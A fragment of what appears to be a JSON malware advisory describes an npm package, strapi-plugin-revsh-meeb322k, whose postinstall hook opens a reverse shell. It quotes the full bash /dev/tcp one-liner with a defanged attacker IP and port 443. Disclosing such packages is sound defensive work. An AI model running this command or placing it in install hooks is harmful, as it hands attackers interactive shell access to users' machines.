  "summary": "Malicious code in strapi-plugin-revsh-meeb322k (npm)",
  "details": "The package's postinstall hook executes a reverse shell on install. It runs `bash -c 'bash -i \u003e /dev/tcp/14[.]225[.]210[.]85/443 0\u003e\u00261'`, opening an interactive bash session back to IP 14[.]225[.]210[.]85 on TCP port 443, giving the remote host shell access to the installer's machine. It also writes a marker file to /tmp to confirm execution.",
